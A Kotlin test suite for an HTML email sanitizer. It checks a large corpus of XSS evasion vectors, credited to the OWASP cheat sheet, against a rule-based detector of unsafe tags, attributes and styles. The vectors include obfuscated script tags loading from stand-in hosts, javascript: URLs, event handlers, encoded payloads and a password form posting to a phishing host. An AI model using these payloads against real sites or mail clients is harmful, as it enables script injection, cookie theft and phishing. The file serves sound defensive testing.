package ch.sonensei.cockpit.mail.sanitize

import io.kotest.matchers.collections.shouldBeEmpty
import org.jsoup.Jsoup
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.EnumSource
import org.junit.jupiter.params.provider.MethodSource

/** Vectors from the OWASP XSS Filter Evasion Cheat Sheet plus mail-specific tricks. */
class XssCorpusTests {
	private val sanitizer = HtmlMailSanitizer()
	private val proxy = ImageProxyUrlBuilder { "/api/v1/mail/image-proxy?url=" + java.net.URLEncoder.encode(it, Charsets.UTF_8) }

	@ParameterizedTest
	@MethodSource("vectors")
	fun `blocked policy leaves nothing executable or loading`(vector: String) {
		violations(sanitizer.sanitize(vector).html).shouldBeEmpty()
	}

	@ParameterizedTest
	@MethodSource("vectors")
	fun `proxy policy leaves nothing executable and only proxied images`(vector: String) {
		val html = sanitizer.sanitize(vector, SanitizeOptions(RemoteImagePolicy.PROXY, proxy)).html
		violations(html, allowProxied = true).shouldBeEmpty()
	}

	@ParameterizedTest
	@EnumSource(RemoteImagePolicy::class)
	fun `all vectors concatenated in one document are neutralized`(policy: RemoteImagePolicy) {
		val html = sanitizer.sanitize(vectors().joinToString("\n"), SanitizeOptions(policy, proxy)).html
		violations(html, allowProxied = policy == RemoteImagePolicy.PROXY).shouldBeEmpty()
	}

	companion object {
		private val allowedTags =
			setOf(
				"a", "abbr", "address", "article", "aside", "b", "bdi", "bdo", "big", "blockquote", "br",
				"caption", "center", "cite", "code", "col", "colgroup", "dd", "del", "details", "dfn", "div",
				"dl", "dt", "em", "figcaption", "figure", "font", "footer", "h1", "h2", "h3", "h4", "h5", "h6",
				"header", "hr", "i", "img", "ins", "kbd", "li", "main", "mark", "ol", "p", "pre", "q", "s",
				"samp", "section", "small", "span", "strike", "strong", "sub", "summary", "sup", "table",
				"tbody", "td", "tfoot", "th", "thead", "time", "tr", "tt", "u", "ul", "var", "wbr",
			)
		private val dangerousInStyle = Regex("url|expression|position|behavior|binding|image-set|image\\(|var\\(|@import|\\\\", RegexOption.IGNORE_CASE)
		private val controlAndSpace = Regex("[\\s\\u0000-\\u001f]")

		/** Returns a description of every unsafe construct in sanitized [html]. */
		fun violations(
			html: String,
			allowProxied: Boolean = false,
		): List<String> {
			val body = Jsoup.parseBodyFragment(html).body()
			val found = mutableListOf<String>()
			for (el in body.select("*").drop(1)) {
				if (el.tagName() !in allowedTags) found += "tag <${el.tagName()}>"
				for (attr in el.attributes()) {
					val name = attr.key.lowercase()
					val value = controlAndSpace.replace(attr.value, "").lowercase()
					if (name.startsWith("on")) found += "event handler $name on <${el.tagName()}>"
					if (value.startsWith("javascript:") || value.startsWith("vbscript:") || value.contains("javascript:")) {
						found += "script URL in $name"
					}
					if (name == "style" && dangerousInStyle.containsMatchIn(attr.value)) found += "style '${attr.value}'"
					if (name == "href" && !(value.startsWith("http:") || value.startsWith("https:") || value.startsWith("mailto:") || value.startsWith("tel:"))) {
						found += "href '$value'"
					}
					if (name == "src") {
						val ok =
							value.startsWith("cid:") ||
								Regex("^data:image/(png|jpe?g|gif|webp|bmp);base64,").containsMatchIn(value) ||
								(allowProxied && value.startsWith("/api/v1/mail/image-proxy?url="))
						if (!ok) found += "src '$value'"
					}
					if (name in setOf("background", "srcset", "poster", "action", "formaction", "xlink:href", "dynsrc", "lowsrc", "data")) {
						found += "attribute $name"
					}
				}
			}
			if (Regex("<script|</script", RegexOption.IGNORE_CASE).containsMatchIn(html)) found += "raw script tag"
			return found
		}

		@JvmStatic
		fun vectors(): List<String> =
			listOf(
				// Basic and obfuscated script tags
				"<SCRIPT SRC=https://xss.example/xss.js></SCRIPT>",
				"<script>alert('XSS')</script>",
				"<SCRIPT/XSS SRC=\"https://xss.example/xss.js\"></SCRIPT>",
				"<SCRIPT/SRC=\"https://xss.example/xss.js\"></SCRIPT>",
				"<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>",
				"<SCRIPT SRC=//xss.example/.j>",
				"<SCRIPT SRC=https://xss.example/xss.js?< B >",
				"<iframe src=https://xss.example/scriptlet.html <",
				"</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
				"<SCRIPT a=\">\" SRC=\"https://xss.example/xss.js\"></SCRIPT>",
				"<SCRIPT =\">\" SRC=\"https://xss.example/xss.js\"></SCRIPT>",
				"<SCRIPT \"a='>'\" SRC=\"https://xss.example/xss.js\"></SCRIPT>",
				"<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"https://xss.example/xss.js\"></SCRIPT>",
				"<scr<script>ipt>alert(1)</scr</script>ipt>",
				// javascript: URLs in image and link attributes
				"<IMG SRC=\"javascript:alert('XSS');\">",
				"<IMG SRC=javascript:alert('XSS')>",
				"<IMG SRC=JaVaScRiPt:alert('XSS')>",
				"<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
				"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
				"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>",
				"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
				"<IMG SRC=# onmouseover=\"alert('xxs')\">",
				"<IMG SRC= onmouseover=\"alert('xxs')\">",
				"<IMG onmouseover=\"alert('xxs')\">",
				"<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
				"<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
				"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
				"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
				"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
				"<IMG SRC=\"jav\tascript:alert('XSS');\">",
				"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
				"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
				"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
				"<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
				"<IMG SRC=\"java\u0000script:alert('XSS');\">",
				"<a href=\"javascript:alert(1)\">click</a>",
				"<a href=\"  JaVaScRiPt:alert(1)\">click</a>",
				"<a href=\"java&#x09;script:alert(1)\">click</a>",
				"<a href=\"vbscript:msgbox(1)\">click</a>",
				"<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>",
				"<a href=\"//xss.example/\">protocol relative</a>",
				"<a href=\"https://ok.example/\" onclick=\"alert(1)\">x</a>",
				"<a href=\"https://ok.example/\" onmouseover=alert(1)>x</a>",
				// Event handlers on arbitrary tags
				"<BODY ONLOAD=alert('XSS')>",
				"<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
				"<div onclick=\"alert(1)\">div</div>",
				"<table onmouseover=alert(1)><tr><td>x</td></tr></table>",
				"<svg/onload=alert('XSS')>",
				"<svg><script>alert(1)</script></svg>",
				"<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
				"<details open ontoggle=alert(1)>",
				"<marquee onstart=alert(1)>x</marquee>",
				"<video poster=javascript:alert(1)//></video>",
				"<audio src=x onerror=alert(1)>",
				"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
				"<input onfocus=alert(1) autofocus>",
				"<select autofocus onfocus=alert(1)>",
				"<textarea autofocus onfocus=alert(1)>",
				"<keygen autofocus onfocus=alert(1)>",
				// Other script-bearing or remote-loading elements
				"<IMG DYNSRC=\"javascript:alert('XSS')\">",
				"<IMG LOWSRC=\"javascript:alert('XSS')\">",
				"<BGSOUND SRC=\"javascript:alert('XSS');\">",
				"<BR SIZE=\"&{alert('XSS')}\">",
				"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
				"<LINK REL=\"stylesheet\" HREF=\"https://xss.example/xss.css\">",
				"<STYLE>@import'https://xss.example/xss.css';</STYLE>",
				"<META HTTP-EQUIV=\"Link\" Content=\"<https://xss.example/xss.css>; REL=stylesheet\">",
				"<STYLE>BODY{-moz-binding:url(\"https://xss.example/xssmoz.xml#xss\")}</STYLE>",
				"<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
				"<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
				"<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
				"<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
				"<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
				"<XSS STYLE=\"behavior: url(xss.htc);\">",
				"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
				"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
				"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
				"<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>",
				"<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
				"<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
				"<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
				"<TABLE BACKGROUND=\"https://tracker.example/bg.png\"><TR><TD>x</TD></TR></TABLE>",
				"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
				"<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
				"<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">",
				"<DIV STYLE=\"width: expression(alert('XSS'));\">",
				"<div style=\"position:fixed;top:0;left:0;width:100%;height:100%\">overlay</div>",
				"<div style=\"POSITION : absolute\">overlay</div>",
				"<div style=\"pos/**/ition: fixed\">overlay</div>",
				"<div style=\"background: image-set('https://tracker.example/a.png' 1x)\">x</div>",
				"<div style=\"background: url (https://tracker.example/a.png)\">x</div>",
				"<div style=\"color: red; background: var(--x)\">x</div>",
				"<BASE HREF=\"javascript:alert('XSS');//\">",
				"<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"https://xss.example/scriptlet.html\"></OBJECT>",
				"<EMBED SRC=\"https://xss.example/xss.swf\" AllowScriptAccess=\"always\"></EMBED>",
				"<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
				"<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">",
				"<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
				"<img src=\"data:image/png;base64,iVBORw0KGgo=\" onerror=\"alert(1)\">",
				"<img srcset=\"https://tracker.example/a.png 1x\">",
				"<img src=\"x\" style=\"background:url(https://tracker.example/b.png)\">",
				"<FORM action=\"https://phish.example/login\"><input name=password type=password><button formaction=\"javascript:alert(1)\">Login</button></FORM>",
				"<form><button formaction=javascript:alert(1)>X</button></form>",
				"<isindex action=javascript:alert(1) type=image>",
				"<template><script>alert(1)</script></template>",
				"<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
				"<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
				"<!-- <img src=x onerror=alert(1)> -->",
				"<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>",
				"<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(&quot;XSS&quot;)</SCRIPT>\"></BODY></HTML>",
				"<SCRIPT>a=/XSS/\nalert(a.source)</SCRIPT>",
				"<a href=\"https://ok.example/\" style=\"position:fixed\" target=\"_top\">overlay link</a>",
				"<p style=\"color:red\" id=\"x\" name=\"y\" data-foo=\"javascript:alert(1)\">p</p>",
				"<portal src=\"https://xss.example/\"></portal>",
			)
	}
}
